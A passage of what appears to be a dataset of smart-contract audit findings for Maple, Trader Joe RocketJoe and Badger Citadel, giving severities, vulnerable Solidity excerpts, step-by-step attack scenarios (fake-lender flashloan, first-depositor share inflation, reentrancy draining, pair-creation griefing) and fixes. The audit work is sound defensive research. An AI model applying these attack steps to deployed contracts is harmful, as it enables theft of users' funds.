    ""MLI:FL:T_TRANSFER_FAILED""
);

require(
    delegateFee == uint256(0) || ERC20Helper.transfer(_fundsAsset, ILenderLike(lender_).poolDelegate(), delegateFee),
    ""MLI:FL:PD_TRANSFER_FAILED""
    );
```

In the current implementation, `mapleTreasury`, `poolDelegate` and `treasuryFee` are taken from user input `lender_`, which can be faked by setting up a contract with `ILenderLike` interfaces.

This allows the attacker to set very high fees, making `_drawableFunds` near 0.

Since `mapleTreasury` and `poolDelegate` are also read from `lender_`, `treasuryFee` and `investorFee` can be retrieved back to the attacker.

As a result, the borrower won't get any `_drawableFunds` while also being unable to remove collateral.

##### PoC

Given:

*   `_collateralRequired` = 10 BTC
*   `_principalRequested` = 1,000,000 USDC
*   `_paymentInterval` = 1 day
*   `_paymentsRemaining` = 10
*   `_gracePeriod` = 1 day

1.  Alice (borrower) calls `postCollateral()` and added `10 BTC` as `_collateralAsset`;
2.  The attacker calls `fundLoan()` by taking `1,000,000 USDC` of flashloan and using a fake `lender`contract;
3.  Alice calls `drawdownFunds()` with any amount > 0 will fail;
4.  Alice calls `removeCollateral()` with any amount > 0 will get ""MLI:DF:INSUFFICIENT_COLLATERAL"" error;
5.  Unless Alice make payment (which is meaningless), after 2 day, the attacker can call `repossess()` and get `10 BTC`.

##### Recommendation

Consider reading `treasuryFee`, `investorFee`, `mapleTreasury`, `poolDelegate` from an authoritative source instead."
79.md,Users can lose value in emergency state,high,"Imagine the following sequence of events:

*   `LaunchEvent.createPair()` is called which sets `wavaxReserve = 0`, adds liquidity to the pair and receives `lpSupply` LP tokens.
*   `LaunchEvent.allowEmergencyWithdraw()` is called which enters emergency / paused mode and disallows normal withdrawals.
*   Users can only call `LaunchEvent.emergencyWithdraw` which reverts as the WAVAX reserve was already used to provide liquidity and cannot be paid out. Users don't receive their LP tokens either. The users lost their entire deposit in this case.

#### Recommendation

Consider paying out LP tokens in `emergencyWithdraw`.




***"
79.md,Wrong token allocation computation for token decimals != 18 if floor price not reached,high,"In `LaunchEvent.createPair`, when the floor price is not reached (`floorPrice > wavaxReserve * 1e18 / tokenAllocated`), the tokens to be sent to the pool are lowered to match the raised WAVAX at the floor price.

Note that the `floorPrice` is supposed to have a precision of 18:

> /// @param \_floorPrice Price of each token in AVAX, scaled to 1e18

The `floorPrice > (wavaxReserve * 1e18) / tokenAllocated` check is correct but the `tokenAllocated` computation involves the `token` decimals:

```solidity
// @audit should be wavaxReserve * 1e18 / floorPrice
tokenAllocated = (wavaxReserve * 10**token.decimals()) / floorPrice;
```

This computation does not work for `token`s that don't have 18 decimals.

#### Example

Assume I want to sell `1.0 wBTC = 1e8 wBTC` (8 decimals) at `2,000.0 AVAX = 2,000 * 1e18 AVAX`.
The `floorPrice` is `2000e18 * 1e18 / 1e8 = 2e31`

Assume the Launch event only raised `1,000.0 AVAX` - half of the floor price for the issued token amount of `1.0 WBTC` (it should therefore allocate only half a WBTC) - and the token amount will be reduced as: `floorPrice = 2e31 > 1000e18 * 1e18 / 1e8 = 1e31 = actualPrice`.
Then, `tokenAllocated = 1000e18 * 1e8 / 2e31 = 1e29 / 2e31 = 0` and no tokens would be allocated, instead of `0.5 WBTC = 0.5e8 WBTC`.

The computation should be `tokenAllocated = wavaxReserve * 1e18 / floorPrice = 1000e18 * 1e18 / 2e31 = 1e39 / 2e31 = 10e38 / 2e31 = 5e7 = 0.5e8`.

#### Recommendation

The new `tokenAllocated` computation should be `tokenAllocated = wavaxReserve * 1e18 / floorPrice;`.




***"
79.md,Improper Upper Bound Definition on the Fee,medium,"The `rJoePerSec` does not have any upper or lower bounds. Values that are too large will lead to reversions in several critical functions.

#### Proof of Concept

<https://github.com/code-423n4/2022-01-trader-joe/blob/a1579f6453bc4bf9fb0db9c627beaa41135438ed/contracts/RocketJoeStaking.sol#L151>
```solidity
function updateEmissionRate(uint256 _rJoePerSec) external onlyOwner {
    updatePool();
    rJoePerSec = _rJoePerSec;
    emit UpdateEmissionRate(msg.sender, _rJoePerSec);
}
```

#### Tools Used

Remix

#### Recommended Mitigation Steps

Consider define  upper and lower bounds on the `_rJoePerSec`.




***"
79.md,Owner of LaunchEvent token has the ability to DOS attack the event,medium,"The owner of the token for which the LaunchEvent was created, has the ability to DOS attack the event. They can prevent the LaunchEvent from creating a JoePair which in turn limits the access to the following two functions: `withdrawLiquidity()` & `withdrawIncentives()`. Thus, stopping anybody from withdrawing their LP tokens.

The owner of the RocketJoe platform has the ability to enable the emergency withdrawal allowing the depositors to take back their AVAX. But, they lose their burned rJOE tokens and the gas fees.

The dev team might use this attack vector if they think the price of their token is too low. In that case, they can DOS attack the LaunchEvent. If the RocketJoe owner enables the emergency withdrawal, the dev team is able to take back their initial deposit. Thus, they don't lose anything but their reputation.

#### Proof of Concept

When `createPair()` is called, the function checks whether a pair already exists. If it does, the transaction is reverted: <https://github.com/code-423n4/2022-01-trader-joe/blob/main/contracts/LaunchEvent.sol#L382-L389>

Anybody is able to create a new JoePair using the existing TraderJoe contracts. If someone owns both AVAX and the LaunchEvent token, they are able to create a new pair and deposit a small amount of liquidity. Thus, the `totalSupply` will be `> 0`. Meaning, at that point, the call to `createPair()` fails. Per design, the LaunchEvent will be used to issue a token to the public market. So only the dev team and its trusted parties have access to the necessary tokens to create a pair and provide liquidity.

<https://github.com/traderjoe-xyz/joe-core/blob/main/contracts/traderjoe/JoeFactory.sol#L30>

<https://github.com/traderjoe-xyz/joe-core/blob/main/contracts/traderjoe/JoePair.sol#L133>

Since `createPair()` can't be executed the `pair` state variable is never initialized: <https://github.com/code-423n4/2022-01-trader-joe/blob/main/contracts/LaunchEvent.sol#L422>

Thus, the following two functions are not reachable any more: <https://github.com/code-423n4/2022-01-trader-joe/blob/main/contracts/LaunchEvent.sol#L439>

<https://github.com/code-423n4/2022-01-trader-joe/blob/main/contracts/LaunchEvent.sol#L469>

If the emergency withdrawal is enabled, the token issuer can take back their deposit: <https://github.com/code-423n4/2022-01-trader-joe/blob/main/contracts/LaunchEvent.sol#L510-L516>

#### Recommended Mitigation Steps

If a LaunchEvent for a token has started, only the LaunchEvent contract should be able to create a JoePair for that token. But, this change has to be made to the contracts that are not in the scope of this audit. I don't think there's a possibility to fix this issue within the RocketJoe contracts.





***"
79.md,`createRJLaunchEvent()` can be called by anyone with 1 Wei of `_token` and stop others from creating RJLaunchEvent with the same token anymore,medium,"<https://github.com/code-423n4/2022-01-trader-joe/blob/119e12d715ececc31478e833297f124cc15d27c2/contracts/RocketJoeFactory.sol#L97-L132>

```solidity
function createRJLaunchEvent(
    address _issuer,
    uint256 _phaseOneStartTime,
    address _token,
    uint256 _tokenAmount,
    uint256 _tokenIncentivesPercent,
    uint256 _floorPrice,
    uint256 _maxWithdrawPenalty,
    uint256 _fixedWithdrawPenalty,
    uint256 _maxAllocation,
    uint256 _userTimelock,
    uint256 _issuerTimelock
) external override returns (address) {
    require(
        getRJLaunchEvent[_token] == address(0),
        ""RJFactory: token has already been issued""
    );
    require(_issuer != address(0), ""RJFactory: issuer can't be 0 address"");
    require(_token != address(0), ""RJFactory: token can't be 0 address"");
    require(_token != wavax, ""RJFactory: token can't be wavax"");
    require(
        _tokenAmount > 0,
        ""RJFactory: token amount needs to be greater than 0""
    );
    require(
        IJoeFactory(factory).getPair(_token, wavax) == address(0) ||
            IJoePair(IJoeFactory(factory).getPair(_token, wavax))
                .totalSupply() ==
            0,
        ""RJFactory: liquid pair already exists""
    );

    address launchEvent = Clones.clone(eventImplementation);

    // msg.sender needs to approve RocketJoeFactory
    IERC20(_token).transferFrom(msg.sender, launchEvent, _tokenAmount);
```

In the current implementation, `RocketJoeFactory.sol#createRJLaunchEvent()` can be called by anyone with at least 1 Wei of `_token`.

This allows a malicious user or attacker to call `createRJLaunchEvent()` with minimal cost and stop others, especially the platform itself or the rightful issuer of the token from creating the RJLaunchEvent.

#### Recommendation

Consider making `createRJLaunchEvent()` only callable by the owner of `RocketJoeFactory`.




***"
79.md,Uninitialized `RocketJoeStaking.lastRewardTimestamp` can inflate `rJoe` supply,medium,"The `RocketJoeStaking.lastRewardTimestamp` is initialized to zero. Usually, this does not matter as `updatePool` is called before the first deposit and when `joeSupply = joe.balanceOf(address(this)) == 0`, it is set to the current time.

```solidity
function updatePool() public {
    if (block.timestamp <= lastRewardTimestamp) {
        return;
    }
    uint256 joeSupply = joe.balanceOf(address(this));

    // @audit lastRewardTimestamp is not initialized. can send 1 Joe to this contract directly => lots of rJoe minted to this contract
    if (joeSupply == 0) {
        lastRewardTimestamp = block.timestamp;
        return;
    }
    uint256 multiplier = block.timestamp - lastRewardTimestamp;
    uint256 rJoeReward = multiplier * rJoePerSec;
    accRJoePerShare =
        accRJoePerShare +
        (rJoeReward * PRECISION) /
        joeSupply;
    lastRewardTimestamp = block.timestamp;

    rJoe.mint(address(this), rJoeReward);
}
```

However, if a user first directly transfers `Joe` tokens to the contract before the first `updatePool` call, the `block.timestamp - lastRewardTimestamp = block.timestamp` will be a large timestamp value and lots of `rJoe` will be minted (but not distributed to users).
Even though they are not distributed to the users, inflating the `rJoe` total supply might not be desired.

#### Recommendation

Consider tracking the actual total deposits in a storage variable and using this value instead of the current balance for `joeSupply`.
This way, transferring tokens to the contract has no influence and depositing through `deposit` first calls `updatePool` and initializes `lastRewardTimestamp`.




***"
79.md,Failed transfer with low level call could be overlooked,medium,"In `LaunchEvent.sol`, the function `_safeTransferAVAX` is as follows:
```solidity
function _safeTransferAVAX(address _to, uint256 _value) internal {
    (bool success, ) = _to.call{value: _value}(new bytes(0));
    require(success, ""LaunchEvent: avax transfer failed"");
}
```

This function is utilized in a few different places in the contract. According to the [Solidity docs](https://docs.soliditylang.org/en/develop/control-structures.html#error-handling-assert-require-revert-and-exceptions)), ""The low-level functions `call`, `delegatecall` and `staticcall` return `true` as their first return value if the account called is non-existent, as part of the design of the EVM. Account existence must be checked prior to calling if needed"".

As a result, it is possible that this call will fail, but `_safeTransferAVAX` will not notice anything went wrong. In particular, it is possible that the address `rocketJoeFactory.penaltyCollector()` is a deleted contract (perhaps a security flaw was found and `selfdestruct` was called so that users know to use an updated smart contract), but `_safeTransferAVAX` will not revert. If `rocketJoeFactory.penaltyCollector()` is indeed a non-existent contract, it would be better for `_safeTransferAVAX` to revert until an admin can manually correct the `penaltyCollector` in the factory.

For reference, see a similar high severity reported in a Uniswap audit here (report # 9): <https://github.com/Uniswap/v3-core/blob/main/audits/tob/audit.pdf>

#### Proof of Concept

See `_safeTransferAVAX` [here](https://github.com/code-423n4/2022-01-trader-joe/blob/a1579f6453bc4bf9fb0db9c627beaa41135438ed/contracts/LaunchEvent.sol#L620). See how this function is called with `_to` as `rocketJoeFactory.penaltyCollector()` [here](https://github.com/code-423n4/2022-01-trader-joe/blob/a1579f6453bc4bf9fb0db9c627beaa41135438ed/contracts/LaunchEvent.sol#L371), but this contract's existence is not verified, which is a problem as described above.

#### Recommended Mitigation Steps

Check for contract existence on low-level calls, so that failures are not missed.





***"
79.md,possibility of minting rJOE tokens before ownership  is changed to RocketJoeStaking,medium,"There is a possibility of the rJOE tokens in RocketJoeToken.sol to be minted by original owner without staking any JOE, before the ownership is transferred to  RocketJoeStaking

#### Proof of Concept

Contract : RocketJoeToken.sol
Line : 37
function mint(address \_to, uint256 \_amount) external onlyOwner {
\_mint(\_to, \_amount);
}

#### Recommended Mitigation Steps

The transferOwnership(address) function inherited from Ownable.sol is used to change to a new owner i.e., RocketJoeStaking.
In the RocketJoeToken.sol contract, define and override this function with an additional check that the totalSupply <= 0





***"
79.md,withdrawAVAX() function has call to sender without reentrancy protection,medium,"In LauchEvent.sol the withdrawAVAX() function makes an external call to the msg.sender by way of \_safeTransferAVAX.  This allows the caller to reenter this and other functions in this and other protocol files.  To prevent reentrancy and cross function reentrancy there should be reentrancy guard modifiers placed on the withdrawAVAX() function and any other function that makes external calls to the caller.

#### Proof of Concept

<https://github.com/code-423n4/2022-01-trader-joe/blob/main/contracts/LaunchEvent.sol#L368>

<https://github.com/code-423n4/2022-01-trader-joe/blob/main/contracts/LaunchEvent.sol#L370>

#### Recommended Mitigation Steps

Add reentrancy guard modifier to withdrawAVAX() function.




***"
79.md,LP Tokens May Be Locked in Contract Due to `allowEmergencyWithdraw()` in Stage 3,medium,"The function [allowEmergencyWithdraw()](https://github.com/code-423n4/2022-01-trader-joe/blob/main/contracts/LaunchEvent.sol#L520) may be called by the `rocketJoeFactory.owner()` at any time. If it is called while the protocol is in Stage 3 and a pair has been created then the LP tokens will be locked and both issues and depositors will be unable to withdraw.

#### Proof of Concept

If `allowEmergencyWithdraw()`  is called `stopped` is set to `true`. As a result functions [withdrawIncentives()](https://github.com/code-423n4/2022-01-trader-joe/blob/main/contracts/LaunchEvent.sol#L468) and [withdrawLiquidity()](https://github.com/code-423n4/2022-01-trader-joe/blob/main/contracts/LaunchEvent.sol#L438) will revert due to the `isStopped(false)` modifier reverting.

Additionally, [emergencyWithdraw()](https://github.com/code-423n4/2022-01-trader-joe/blob/main/contracts/LaunchEvent.sol#L494) will revert since all the `WAVAX` and `token` balances have been transferred to the liquidity pool.

Thus, depositors and issuers will have no methods of removing their LP tokens or incentives.

#### Recommended Mitigation Steps

Consider adding the requirement `require(address(pair) != address(0), ""LaunchEvent: pair not created"");` to the function `allowEmergencyWithdraw()`.




***"
79.md,`createPair()` expects zero slippage,medium,"The LaunchEvent.sol `createPair()` function calls router.addLiquidity() with a amountADesired == amountAMin and amountBDesired == amountBMin. Because there is no allowance for slippage, if the zero slippage requirement is not met then the addLiquidity() function [will revert](https://github.com/traderjoe-xyz/joe-core/blob/5c2ca96c3835e7f2660f2904a1224bb7c8f3b7a7/contracts/traderjoe/JoeRouter02.sol#L52-L57) and prevent users from using the createPair() function. This could be caused either by frontrunning the createPair call or in a situation where the liquidity pool exists but does not allow for zero slippage with the assets it is holding.

#### Proof of Concept

The zero slippage addLiquidity call is found [in LaunchEvent.sol](https://github.com/code-423n4/2022-01-trader-joe/blob/a1579f6453bc4bf9fb0db9c627beaa41135438ed/contracts/LaunchEvent.sol#L411). This code may have been written with the assumption that only Rocket Joe will have a balance of the new token, so no other user could call the addLiquidity function with both assets, since the whitepaper states ""Rocket Joe liquidity launch will complete before launchpad public sale release any tokens to the public"". However, the new token contract should be considered untrusted and Rocket Joe cannot guarantee where all the new tokens are before phase 3 of the Rocket Joe launch event, which is when `createPair()` is called. The token creator who has control over the token allocation is not controlled by Trader Joe, so an attacker who has early access to the new token can break the outlined assumptions.

#### Recommended Mitigation Steps

Consider how the launch event functions may break if the new token is launched by an attacker who doesn't follow the assumptions outlined. One solution for this `createPair()` issue is to add an input parameter to the function to handle a slippage allowance.





***"
79.md,Use safeTransfer/safeTransferFrom consistently instead of transfer/transferFrom,medium,"It is good to add a require() statement that checks the return value of token transfers or to use something like OpenZeppelin’s safeTransfer/safeTransferFrom unless one is sure the given token reverts in case of a failure. Failure to do so will cause silent failures of transfers and affect token accounting in contract.

#### Proof of Concept

<https://github.com/code-423n4/2022-01-trader-joe/blob/main/contracts/LaunchEvent.sol#L457>

<https://github.com/code-423n4/2022-01-trader-joe/blob/main/contracts/LaunchEvent.sol#L463>

<https://github.com/code-423n4/2022-01-trader-joe/blob/main/contracts/LaunchEvent.sol#L489>

<https://github.com/code-423n4/2022-01-trader-joe/blob/main/contracts/LaunchEvent.sol#L513>

<https://github.com/code-423n4/2022-01-trader-joe/blob/main/contracts/LaunchEvent.sol#L537>

#### Recommended Mitigation Steps

Consider using safeTransfer/safeTransferFrom or require() consistently.





***"
79.md,Re-enterable Code When Making a Deposit to Stake,medium,"Note: this attack requires `rJoe` to relinquish control during `tranfer()` which under the current [RocketJoeToken](https://github.com/code-423n4/2022-01-trader-joe/blob/main/contracts/RocketJoeToken.sol) it does not. Thus this vulnerability is raised as medium rather than high. Although it's not exploitable currently, it is a highly risky code pattern that should be avoided.

This vulnerability would allow the entire rJoe balance to be drained from the contract.

#### Proof of Concept

The function [deposit()](https://github.com/code-423n4/2022-01-trader-joe/blob/main/contracts/RocketJoeStaking.sol#L96) would be vulnerable to reentrancy if rJoe relinquished control flow.

The following lines show the reward calculations in variable `pending`. These calculations use two state variables `user.amount` and `user.rewardDebt`. Each of these are updated after `_safeRJoeTransfer()`.

Thus if an attacker was able to get control flow during the `rJoe::tranfer()` function they would be able to reenter `deposit()` and the value calculated for `pending`would be the same as the previous iteration hence they would again be transferred `pending` rJoe tokens. During the rJoe transfer the would again gain control of the execution and call `deposit()` again. The process could be repeated until the entire rJoe balance of the contract has been transferred to the attacker.

```solidity
if (user.amount > 0) {
    uint256 pending = (user.amount * accRJoePerShare) /
        PRECISION -
        user.rewardDebt;
    _safeRJoeTransfer(msg.sender, pending);
}
user.amount = user.amount + _amount;
user.rewardDebt = (user.amount * accRJoePerShare) / PRECISION;
```

#### Recommended Mitigation Steps

There are two possible mitigations. First is to use the [openzeppelin reentrancy guard](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/security/ReentrancyGuard.sol) over the `deposit()` function which will prevent multiple deposits being made simultaneously.

The second mitigation is to follow the [checks-effects-interactions](https://docs.soliditylang.org/en/v0.8.11/security-considerations.html#re-entrancy) pattern. This would involve updating all state variables before making any external calls.





***"
79.md,Pair creation can be denied,medium,"The `LaunchEvent.createPair` requires that no previous pool was created for the `WAVAX <> _token` pair.

```solidity
function createPair() external isStopped(false) atPhase(Phase.PhaseThree) {
    (address wavaxAddress, address tokenAddress) = (
        address(WAVAX),
        address(token)
    );
    // @audit grief: anyone can create pair
    require(
        factory.getPair(wavaxAddress, tokenAddress) == address(0),
        ""LaunchEvent: pair already created""
    );

    // ...
}
```

A griefer can create a pool for the `WAVAX <> _token` pair by calling [`JoeFactory.createPair(WAVAX, _token)`](https://snowtrace.io/address/0x9ad6c38be94206ca50bb0d90783181662f0cfa10#contracts) while the launch event phase 1 or 2 is running.
No liquidity can then be provided and an emergency state must be triggered for users and the issuer to be able to withdraw again.

#### Recommendation

It must be assumed that the pool is already created and even initialized as pool creation and liquidity provisioning is permissionless.
Special attention must be paid if the pool is already initialized with liquidity at a different price than the launch event price.

It would be enough to have a standard min. LP return ""slippage"" check (using parameter values for `amountAMin/amountBMin` instead of the hardcoded ones in `router.addLiquidity`) in `LaunchEvent.createPair()`.
The function must then be callable with special privileges only, for example, by the issuer.
Alternatively, the slippage check can be hardcoded as a percentage of the raised amounts (`amountADesired = 0.95 * wavaxReserve, amountBDesired = 0.95 * tokenAllocated`).

This will prevent attacks that try to provide LP at a bad pool price as the transaction will revert when receiving less than the slippage parameter.
If the pool is already initialized, it should just get arbitraged to the auction token price and liquidity can then be provided at the expected rate again.





***"
79.md,ERC20 return values not checked,medium,"The `ERC20.transfer()` and `ERC20.transferFrom()` functions return a boolean value indicating success. This parameter needs to be checked for success.
Some tokens do **not** revert if the transfer failed but return `false` instead.
Tokens that don't actually perform the transfer and return `false` are still counted as a correct transfer.

#### Recommendation

As the Launch event token can be any token, all interactions with it should follow correct EIP20 checks.
We recommend checking the `success` boolean of all `.transfer` and `.transferFrom` calls for the unknown `token` contract.

*   `LaunchEvent.withdrawLiquidity`: `token.transfer(msg.sender, amount);`
*   `LaunchEvent.withdrawIncentives`: `token.transfer(msg.sender, amount);`
*   `LaunchEvent.emergencyWithdraw`: `token.transfer(msg.sender, amount);`
*   `LaunchEvent.skim`: `token.transfer(msg.sender, amount);`
*   `RocketJoeFactory.createRJLaunchEvent`: `IERC20(_token).transferFrom(msg.sender, launchEvent, _tokenAmount);`





***"
79.md,Incompatibility With Rebasing/Deflationary/Inflationary tokens,medium,"The TraderJOE protocol do not appear to support rebasing/deflationary/inflationary tokens whose balance changes during transfers or over time. The necessary checks include at least verifying the amount of tokens transferred to contracts before and after the actual transfer to infer any fees/interest.

#### Proof of Concept

<https://github.com/code-423n4/2022-01-trader-joe/blob/main/contracts/RocketJoeStaking.sol#L133>

<https://github.com/code-423n4/2022-01-trader-joe/blob/main/contracts/RocketJoeFactory.sol#L132>

#### Recommended Mitigation Steps

*   Ensure that to check previous balance/after balance  equals to amount for any rebasing/inflation/deflation
*   Add support in contracts for such tokens before accepting user-supplied tokens
*   Consider supporting deflationary / rebasing / etc tokens by extra checking the balances before/after or strictly inform your users not to use such tokens if they don't want to lose them.





***"
79.md,Lack of input checks (withrawal penalties should always be greater than 0),medium,"If penalties are set to 0 the protocol would be vulnerable to price manipulations like the one described in the contest documentation.

#### Proof of Concept

The protocol uses economic penalties to punish withdraws to protect against economic price manipulation attacks. If these penalties are set to 0 in the creation of a token launch the sale would be vulnerable to this kind of attack. The penalties should never be 0 for any token sale.

The economic attack that could be done with 0 penalties is detailed on page 7 of the whitepaper.

<https://github.com/traderjoe-xyz/research/blob/main/RocketJoe_Launch_Platform_for_Bootstrapping_Protocol-Owned_Liquidity.pdf>

I consider this to be a medium risk since it could completely invalidate a token launch but it's still unlikely (but possible) the creators will set penalties to 0. This could be done by mistake or by the creators of the launch event to exploit it themselves.

#### Recommended Mitigation Steps

Require penalties to be greater than 0 either in the initializer function or in the factory.





***"
110.md,StakedCitadel doesn't use correct balance for internal accounting,high,"<https://github.com/code-423n4/2022-04-badger-citadel/blob/main/src/StakedCitadel.sol#L291-L295>

<https://github.com/code-423n4/2022-04-badger-citadel/blob/main/src/StakedCitadel.sol#L772-L776>

<https://github.com/code-423n4/2022-04-badger-citadel/blob/main/src/StakedCitadel.sol#L881-L893>

### Impact

The StakedCitadel contract's `balance()` function is supposed to return the balance of the vault + the balance of the strategy. But, it only returns the balance of the vault. The balance is used to determine the number of shares that should be minted when depositing funds into the vault and the number of shares that should be burned when withdrawing funds from it.

Since most of the funds will be located in the strategy, the vault's balance will be very low. Some of the issues that arise from this:

**You can't deposit to a vault that already minted shares but has no balance of the underlying token**:

1.  fresh vault with 0 funds and 0 shares
2.  Alice deposits 10 tokens. She receives 10 shares back (<https://github.com/code-423n4/2022-04-badger-citadel/blob/main/src/StakedCitadel.sol#L887-L888>)
3.  Vault's tokens are deposited into the strategy (now `balance == 0` and `totalSupply == 10`)
4.  Bob tries to deposit but the transaction fails because the contract tries to divide by zero: <https://github.com/code-423n4/2022-04-badger-citadel/blob/main/src/StakedCitadel.sol#L890> (`pool == balance()`)

**You get more shares than you should**

1.  fresh vault with 0 funds and 0 shares
2.  Alice deposits 10 tokens. She receives 10 shares back (<https://github.com/code-423n4/2022-04-badger-citadel/blob/main/src/StakedCitadel.sol#L887-L888>)
3.  Vault's tokens are deposited into the strategy (now `balance == 0` and `totalSupply == 10`)
4.  Bob now first transfers 1 token to the vault so that the balance is now `1` instead of `0`.
5.  Bob deposits 5 tokens. He receives `5 * 10 / 1 == 50` shares: <https://github.com/code-423n4/2022-04-badger-citadel/blob/main/src/StakedCitadel.sol#L890>

Now, the vault received 15 tokens. 10 from Alice and 5 from Bob. But Alice only has 10 shares while Bob has 50. Thus, Bob can withdraw more tokens than he should be able to.

It simply breaks the whole accounting of the vault.

### Proof of Concept

The comment says that it should be vault's + strategy's balance:
<https://github.com/code-423n4/2022-04-badger-citadel/blob/main/src/StakedCitadel.sol#L291-L295>

Here's another vault from the badger team where the function is implemented correctly: <https://github.com/Badger-Finance/badger-vaults-1.5/blob/main/contracts/Vault.sol#L262>

### Recommended Mitigation Steps

Add the strategy's balance to the return value of the`balance()` function like [here](https://github.com/Badger-Finance/badger-vaults-1.5/blob/main/contracts/Vault.sol#L262).




***"
110.md,StakedCitadel: wrong setupVesting function name,high,"In the `\_withdraw` function of the StakedCitadel contract, the setupVesting function of vesting is called, while in the StakedCitadelVester contract, the function name is vest, which will cause the \_withdraw function to fail, so that the user cannot withdraw the tokens.

            IVesting(vesting).setupVesting(msg.sender, _amount, block.timestamp);
            token.safeTransfer(vesting, _amount);
            ...
        function vest(
            address recipient,
            uint256 _amount,
            uint256 _unlockBegin
        ) external {
            require(msg.sender == vault, ""StakedCitadelVester: only xCTDL vault"");
            require(_amount > 0, ""StakedCitadelVester: cannot vest 0"");

            vesting[recipient].lockedAmounts =
                vesting[recipient].lockedAmounts +
                _amount;
            vesting[recipient].unlockBegin = _unlockBegin;
            vesting[recipient].unlockEnd = _unlockBegin + vestingDuration;

            emit Vest(
                recipient,
                vesting[recipient].lockedAmounts,
                _unlockBegin,
                vesting[recipient].unlockEnd
            );
        }

### Proof of Concept

<https://github.com/code-423n4/2022-04-badger-citadel/blob/main/src/StakedCitadel.sol#L830>

<https://github.com/code-423n4/2022-04-badger-citadel/blob/main/src/interfaces/citadel/IVesting.sol#L5>

### Recommended Mitigation Steps

Use the correct function name

    interface IVesting {
        function vest(
            address recipient,
            uint256 _amount,
            uint256 _unlockBegin
        ) external;
    }
    ...
    IVesting(vesting).vest(msg.sender, _amount, block.timestamp);
    token.safeTransfer(vesting, _amount);

 



***"
110.md,StakedCitadel depositors can be attacked by the first depositor with depressing of vault token denomination,high,"<https://github.com/code-423n4/2022-04-badger-citadel/blob/main/src/StakedCitadel.sol#L881-L892>

<https://github.com/code-423n4/2022-04-badger-citadel/blob/main/src/StakedCitadel.sol#L293-L295>

### Impact

An attacker can become the first depositor for a recently created StakedCitadel contract, providing a tiny amount of Citadel tokens by calling `deposit(1)` (raw values here, `1` is `1 wei`, `1e18` is `1 Citadel` as it has 18 decimals). Then the attacker can directly transfer, for example, `10^6*1e18 - 1` Citadel to StakedCitadel, effectively setting the cost of `1` of the vault token to be `10^6 * 1e18` Citadel. The attacker will still own 100% of the StakedCitadel's pool being the only depositor.

All subsequent depositors will have their Citadel token investments rounded to `10^6 * 1e18`, due to the lack of precision which initial tiny deposit caused, with the remainder divided between all current depositors, i.e. the subsequent depositors lose value to the attacker.

For example, if the second depositor brings in `1.9*10^6 * 1e18` Citadel, only `1` of new vault to be issued as `1.9*10^6 * 1e18` divided by `10^6 * 1e18` will yield just `1`, which means that `2.9*10^6 * 1e18` total Citadel pool will be divided 50/50 between the second depositor and the attacker, as each have 1 wei of the total 2 wei of vault tokens, i.e. the depositor lost and the attacker gained `0.45*10^6 * 1e18` Citadel tokens.

As there are no penalties to exit with StakedCitadel.withdraw(), the attacker can remain staked for an arbitrary time, gathering the share of all new deposits' remainder amounts.

Placing severity to be high as this is principal funds loss scenario for many users (most of depositors), easily executable, albeit only for the new StakedCitadel contract.

### Proof of Concept

deposit() -> \_depositFor() -> \_mintSharesFor() call doesn't require minimum amount and mints according to the provided amount:

deposit:

<https://github.com/code-423n4/2022-04-badger-citadel/blob/main/src/StakedCitadel.sol#L309-L311>

\_depositFor:

<https://github.com/code-423n4/2022-04-badger-citadel/blob/main/src/StakedCitadel.sol#L764-L777>

\_mintSharesFor:

<https://github.com/code-423n4/2022-04-badger-citadel/blob/main/src/StakedCitadel.sol#L881-L892>

When StakedCitadel is new the `_pool = balance()` is just initially empty contract balance:

<https://github.com/code-423n4/2022-04-badger-citadel/blob/main/src/StakedCitadel.sol#L293-L295>

Any deposit lower than total attacker's stake will be fully stolen from the depositor as `0` vault tokens will be issued in this case.

### References

The issue is similar to the `TOB-YEARN-003` one of the Trail of Bits audit of Yearn Finance:

<https://github.com/yearn/yearn-security/tree/master/audits/20210719_ToB_yearn_vaultsv2>

### Recommended Mitigation Steps

A minimum for deposit value can drastically reduce the economic viability of the attack. I.e. `deposit() -> ...` can require each amount to surpass the threshold, and then an attacker would have to provide too big direct investment to capture any meaningful share of the subsequent deposits.

An alternative is to require only the first depositor to freeze big enough initial amount of liquidity. This approach has been used long enough by various projects, for example in Uniswap V2:

<https://github.com/Uniswap/v2-core/blob/master/contracts/UniswapV2Pair.sol#L119-L121>



 > Also worth noting that anyone else can still get more deposits in and get their fair share, it's just that the first deposit would now require a deposit of at least `vault.balanceOf` in order to get the fair amount of shares (which at this point would be rebased to be 1 = `prevBalanceOf`) 




***"
110.md,Guaranteed citadel profit,medium,"User can sandwich `mintAndDistribute` function if mintable is high enough

*   Deposit before
*   Withdraw after
*   Take after 21 days citadels

### Proof of Concept

`mintAndDistribute` increase a price of staking share, that allows to withdraw more than deposited.
user takes part of distributed citadels, so different users have smaller profit from distribution

### Recommended Mitigation Steps

Call `mintAndDistribute` through flashbots





***"
110.md,Funding.deposit() doesn't work if there is no discount set,medium,"<https://github.com/code-423n4/2022-04-badger-citadel/blob/main/src/Funding.sol#L177>

<https://github.com/code-423n4/2022-04-badger-citadel/blob/main/src/Funding.sol#L202>

<https://github.com/code-423n4/2022-04-badger-citadel/blob/main/src/Funding.sol#L184>

<https://github.com/code-423n4/2022-04-badger-citadel/blob/main/src/StakedCitadel.sol#L769>

### Impact

The Funding contract's `deposit()` function uses the `getAmountOut()` function to determine how many citadel tokens the user should receive for their deposit. But, if no discount is set, the function always returns 0. Now the `deposit()` function tries to deposit 0 tokens for the user through the StakedCitadel contract. But, that function requires the number of tokens to be `!= 0`. The transaction reverts.

This means, that no deposits are possible. Unless there is a discount.

### Proof of Concept

`Funding.deposit()` calls `getAmountOut()`: <https://github.com/code-423n4/2022-04-badger-citadel/blob/main/src/Funding.sol#L177>

Here's the [`getAmountOut()` function](https://github.com/code-423n4/2022-04-badger-citadel/blob/main/src/Funding.sol#L202):

```sol
    function getAmountOut(uint256 _assetAmountIn)
        public
        view
        returns (uint256 citadelAmount_)
    {
        uint256 citadelAmountWithoutDiscount = _assetAmountIn * citadelPriceInAsset;

        if (funding.discount > 0) {
            citadelAmount_ =
                (citadelAmountWithoutDiscount * MAX_BPS) /
                (MAX_BPS - funding.discount);
        }

        // unless the above if block is executed, `citadelAmount_` is 0 when this line is executed.
        // 0 = 0 / x
        citadelAmount_ = citadelAmount_ / assetDecimalsNormalizationValue;
    }
```

Call to `StakedCitadel.depositFor()`: <https://github.com/code-423n4/2022-04-badger-citadel/blob/main/src/Funding.sol#L184>

